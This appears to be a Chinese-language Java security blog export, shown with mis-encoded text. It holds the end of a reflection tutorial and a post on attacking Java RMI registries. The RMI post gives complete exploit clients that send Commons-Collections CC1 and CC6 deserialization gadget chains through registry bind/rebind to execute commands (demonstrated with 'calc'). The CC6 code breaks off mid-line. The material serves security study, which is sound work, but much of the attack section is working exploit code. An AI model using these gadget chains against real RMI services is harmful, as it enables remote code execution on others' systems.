<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516113750554.png" alt="image-20240516113750554"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516130817172.png" alt="image-20240516130817172"></p>
<h2 id="å°ç»ƒä¹ ï¼Œåå°„å¼¹è®¡ç®—å™¨"><a href="#å°ç»ƒä¹ ï¼Œåå°„å¼¹è®¡ç®—å™¨" class="headerlink" title="å°ç»ƒä¹ ï¼Œåå°„å¼¹è®¡ç®—å™¨"></a>å°ç»ƒä¹ ï¼Œåå°„å¼¹è®¡ç®—å™¨</h2><p>æ­£å¸¸æƒ…å†µä¸‹å’±ä»¬å¼¹è®¡ç®—å™¨<img src="https://image.sp4rks.xyz/2024/06/image-20240516133359336.png" alt="image-20240516133359336"></p>
<p>åå°„å†™æ³•</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516141618708.png" alt="image-20240516141618708"></p>
<p>å› ä¸º <code>getRuntime()</code>æ˜¯é™æ€æ–¹æ³•ï¼Œå±äºç±»ï¼Œæ‰€ä»¥<code>getRuntime.invoke()</code>;ä¸éœ€è¦æŒ‡å®šå¯¹è±¡ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//è°ƒç”¨ getRuntime æ–¹æ³•ï¼Œè·å¾— Runtime ç±»çš„å®ä¾‹</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">runtimeInstance</span> <span class="hljs-operator">=</span> getRuntime.invoke(<span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516143222774.png" alt="image-20240516143222774"></p>
<p>å®Œæ•´ä»£ç </p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><br>        <span class="hljs-comment">//è·å–Runtime ç±»çš„ Class å¯¹è±¡</span><br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-comment">//è·å– Runtime ç±»ä¸­åä¸º getRuntime çš„æ–¹æ³•çš„å¼•ç”¨</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getRuntime</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br>        <span class="hljs-comment">//è°ƒç”¨ getRuntime æ–¹æ³•ï¼Œè·å¾— Runtime ç±»çš„å®ä¾‹</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">runtimeInstance</span> <span class="hljs-operator">=</span> getRuntime.invoke(<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">//getMethod() æ–¹æ³•è·å– exec æ–¹æ³•çš„å¼•ç”¨</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        <span class="hljs-comment">//ç”¨ invoke() æ–¹æ³•è°ƒç”¨ exec</span><br>        exec.invoke(runtimeInstance, <span class="hljs-string">&quot;calc&quot;</span>);<br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>



<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://blog.csdn.net/MrYushiwen/article/details/107380536">JAVAåå°„</a></p>
<p><a href="https://www.javasec.org/javase/Reflection/Reflection.html">javaåå°„æœºåˆ¶</a></p>
<p><a href="https://xz.aliyun.com/t/7029?time__1311=n4+xnD0GDti=zuDBqooGkY=G=L1K7K6dx&alichlgref=https://xz.aliyun.com/t/7029#toc-0">JAVAååºåˆ—åŒ– - åå°„æœºåˆ¶</a></p>
<p><a href="https://xz.aliyun.com/t/9117?time__1311=n4+xuDgD9DyDnDfhx0O4BqDwp0YicWe4FPmD&alichlgref=https://www.google.com/">JAVAå®‰å…¨åŸºç¡€ï¼ˆäºŒï¼‰â€“ åå°„æœºåˆ¶</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVAå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVAååºåˆ—åŒ–-RMIæ”»å‡»ç¯‡</title>
    <url>/2025/01/14/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/RMI%E4%B8%93%E9%A2%98-%E6%94%BB%E5%87%BB%E7%AF%87/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¸Šä¸€ç¯‡ä¸»è¦å†™äº†RMIçš„æµç¨‹ï¼Œè¿™ç¯‡åŸºäºä¸Šç¯‡æµç¨‹ï¼Œä¸»è¦å†™ä¸€ä¸‹æ”»å‡»ç‚¹ï¼Œä¹Ÿæ˜¯å±äºæ‰åœ¨å‰è¾ˆçš„è‚©è†€ä¸Šçœ‹ä¸–ç•Œäº†ã€‚</p>
<h1 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h1><h2 id="è°ƒè¯•å‡†å¤‡"><a href="#è°ƒè¯•å‡†å¤‡" class="headerlink" title="è°ƒè¯•å‡†å¤‡"></a>è°ƒè¯•å‡†å¤‡</h2><p>æœ¬ç¯‡æ¶‰åŠå¤§é‡çš„ä»£ç è°ƒè¯•ï¼Œç”±äºOracle JDK sunåŒ…æ²¡æœ‰æºç ï¼Œæ˜¯åç¼–è¯‘çš„ï¼Œé˜…è¯»ä½“éªŒä¸å¥½ï¼Œå¦‚ä¸‹å›¾ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨openjdkçš„sunæºç ï¼Œæå‡æˆ‘ä»¬çš„é˜…è¯»ä½“éªŒã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250113204722738.png" alt="image-20250113204722738"></p>
<p>å…·ä½“æ­¥éª¤æ˜¯ï¼ŒæŸ¥è¯¢æˆ‘ä»¬å½“å‰ä½¿ç”¨çš„ç‰ˆæœ¬ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250113205045176.png" alt="image-20250113205045176"></p>
<p>å»è¿™é‡Œæ‰¾åˆ°å¯¹åº”çš„ç‰ˆæœ¬å·<a href="https://github.com/openjdk/jdk8u">https://github.com/openjdk/jdk8u</a> è¿™ä¸ªå°±æ˜¯æºç ï¼ˆå½“ç„¶å…¶å®ä¹Ÿä¸ä¸€å®šéå¸¸å‡†ç¡®ï¼Œå› ä¸ºé‡Œé¢è¿˜æ¶‰åŠåˆ°Oracle JDkå’ŒOpenJDKçš„å·®åˆ«ï¼Œç‰ˆæœ¬å·å¯èƒ½æœ‰ä¸€äº›å·®å¼‚ï¼Œä½†å…¶å®åå·®ä¹Ÿä¸ä¼šå¾ˆå¤§ï¼‰</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250113204445049.png" alt="image-20250113204445049"></p>
<p>æˆ‘ä»¬æ‰“å¼€é¡¹ç›®çš„é…ç½®ï¼Œæ‰¾åˆ°SDKï¼Œç„¶åç‚¹å¼€Sourcepathè¿™ä¸ªé€‰é¡¹å¡ï¼Œæ­£å¸¸æƒ…å†µä¸‹é‡Œé¢ä¼šæœ‰ä¸¤ä¸ªé»˜è®¤çš„æºç ç›®å½•ï¼Œåˆ†åˆ«æ˜¯src.zipå’Œjavafx-src.zipã€‚æˆ‘ä»¬å°†åˆšæ‰ä¸‹è½½çš„æºç çš„å­ç›®å½•jdk&#x2F;src&#x2F;share&#x2F;classes&#x2F;sunåŠ è¿›å»ï¼Œå°±å¯ä»¥æ­£å¸¸è°ƒè¯•äº†ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250113205314705.png" alt="image-20250113205314705"></p>
<h1 id="æ”»å‡»æ³¨å†Œä¸­å¿ƒ"><a href="#æ”»å‡»æ³¨å†Œä¸­å¿ƒ" class="headerlink" title="æ”»å‡»æ³¨å†Œä¸­å¿ƒ"></a>æ”»å‡»æ³¨å†Œä¸­å¿ƒ</h1><p>å‰é¢æˆ‘ä»¬æåˆ°äº†ï¼Œå®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒ-å®¢æˆ·ç«¯æ˜¯è°ƒç”¨<code>RegistryImpl_Stub</code>çš„æ–¹æ³•ï¼Œé‚£ä¸Registryäº¤äº’çš„æ–¹æ³•æœ‰listã€bindã€rebindã€unbindã€lookup</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241231115603138.png" alt="image-20241231115603138"></p>
<p>è¿™äº›æ–¹æ³•å¯¹åº”çš„å¤„ç†é€»è¾‘ç”±æœåŠ¡ç«¯ <code>RegistryImpl_Skel</code> çš„ <code>dispatch</code> æ–¹æ³•æ¥å®Œæˆã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispatch</span><span class="hljs-params">(Remote var1, RemoteCall var2, <span class="hljs-type">int</span> var3, <span class="hljs-type">long</span> var4)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span> (var4 != <span class="hljs-number">4905912898345647071L</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SkeletonMismatchException</span>(<span class="hljs-string">&quot;interface hash mismatch&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">RegistryImpl</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> (RegistryImpl)var1;<br>            <span class="hljs-keyword">switch</span> (var3) &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                    String var100;<br>                    Remote var103;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var105</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                        var100 = (String)var105.readObject();<br>                        var103 = (Remote)var105.readObject();<br>                    &#125; <span class="hljs-keyword">catch</span> (IOException var94) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var94);<br>                    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var95) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var95);<br>                    &#125; <span class="hljs-keyword">finally</span> &#123;<br>                        var2.releaseInputStream();<br>                    &#125;<br><br>                    var6.bind(var100, var103);<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        var2.getResultStream(<span class="hljs-literal">true</span>);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125; <span class="hljs-keyword">catch</span> (IOException var93) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var93);<br>                    &#125;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                    var2.releaseInputStream();<br>                    String[] var99 = var6.list();<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var102</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                        var102.writeObject(var99);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125; <span class="hljs-keyword">catch</span> (IOException var92) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var92);<br>                    &#125;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                    String var98;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var104</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                        var98 = (String)var104.readObject();<br>                    &#125; <span class="hljs-keyword">catch</span> (IOException var89) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var89);<br>                    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var90) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var90);<br>                    &#125; <span class="hljs-keyword">finally</span> &#123;<br>                        var2.releaseInputStream();<br>                    &#125;<br><br>                    <span class="hljs-type">Remote</span> <span class="hljs-variable">var101</span> <span class="hljs-operator">=</span> var6.lookup(var98);<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                        var9.writeObject(var101);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125; <span class="hljs-keyword">catch</span> (IOException var88) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var88);<br>                    &#125;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                    Remote var8;<br>                    String var97;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var11</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                        var97 = (String)var11.readObject();<br>                        var8 = (Remote)var11.readObject();<br>                    &#125; <span class="hljs-keyword">catch</span> (IOException var85) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var85);<br>                    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var86) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var86);<br>                    &#125; <span class="hljs-keyword">finally</span> &#123;<br>                        var2.releaseInputStream();<br>                    &#125;<br><br>                    var6.rebind(var97, var8);<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        var2.getResultStream(<span class="hljs-literal">true</span>);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125; <span class="hljs-keyword">catch</span> (IOException var84) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var84);<br>                    &#125;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                    String var7;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                        var7 = (String)var10.readObject();<br>                    &#125; <span class="hljs-keyword">catch</span> (IOException var81) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var81);<br>                    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var82) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var82);<br>                    &#125; <span class="hljs-keyword">finally</span> &#123;<br>                        var2.releaseInputStream();<br>                    &#125;<br><br>                    var6.unbind(var7);<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        var2.getResultStream(<span class="hljs-literal">true</span>);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125; <span class="hljs-keyword">catch</span> (IOException var80) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var80);<br>                    &#125;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;invalid method number&quot;</span>);<br>            &#125;<br><br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>å¦‚æœå­˜åœ¨å¯¹ä¼ å…¥çš„å¯¹è±¡è°ƒç”¨ <code>readObject()</code> æ–¹æ³•ï¼Œåˆ™å¯ä»¥åˆ©ç”¨ï¼Œ<code>dispatch</code> é‡Œé¢å¯¹åº”å…³ç³»å¦‚ä¸‹ï¼š</p>
<p><code>case 0---&gt;bindã€case 1---&gt;listã€case 2---&gt;lookupã€case 3---&gt;rebindã€case 4---&gt;unbind</code></p>
<h2 id="bindã€rebind"><a href="#bindã€rebind" class="headerlink" title="bindã€rebind"></a>bindã€rebind</h2><p>å…¶ä¸­è¿œç¨‹è°ƒç”¨<code>bind()ã€rebind()</code>ç»‘å®šæœåŠ¡æ—¶ï¼Œæ³¨å†Œä¸­å¿ƒä¼šå¯¹æ¥æ”¶åˆ°çš„åºåˆ—åŒ–çš„å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬åªéœ€è¦å®¢æˆ·ç«¯ä¼ å…¥ä¸€ä¸ªæ¶æ„çš„å¯¹è±¡å³å¯ã€‚è¿™é‡Œåˆ©ç”¨CC1å’ŒCC6åšæ¼”ç¤ºï¼š</p>
<p>CC1ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br><br>        <span class="hljs-comment">//åˆ›å»ºæ¶æ„ InvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) getEvilClass();<br><br>        <span class="hljs-comment">//ä½¿ç”¨AnnotationInvocationHandleråŠ¨æ€ä»£ç†Remote</span><br>        <span class="hljs-type">Remote</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Remote.class&#125;, handler);<br><br>        <span class="hljs-comment">//bindåˆ°registryæ—¶ä¼šè§¦å‘ååºåˆ—åŒ–</span><br>        registry.bind(<span class="hljs-string">&quot;hello&quot;</span>, remote);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getEvilClass</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformerMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class, transformerMap);<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>CC6ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException &#123;<br>        <span class="hljs-comment">//è¿æ¥registry</span><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br><br>        <span class="hljs-comment">//ä½¿ç”¨AnnotationInvocationHandleråŠ¨æ€ä»£ç†Remote</span><br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; declaredConstructor = clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br><br>        declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;hello&quot;</span>, getEvilClass());<br><br>        <span class="hljs-comment">//ä½¿ç”¨åŠ¨æ€ä»£ç†åˆå§‹åŒ– AnnotationInvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Target.class,map);<br><br>        <span class="hljs-comment">//ä½¿ç”¨AnnotationInvocationHandleråŠ¨æ€ä»£ç†Remote</span><br>        <span class="hljs-type">Remote</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> (Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Remote.class&#125;, handler);<br><br>        <span class="hljs-comment">//bindåˆ°registryæ—¶ä¼šè§¦å‘ååºåˆ—åŒ–</span><br>        registry.rebind(<span class="hljs-string">&quot;hello&quot;</span>, remote);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getEvilClass</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IllegalAccessException, NoSuchFieldException &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>[]&#123;&#125;);<br><br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span 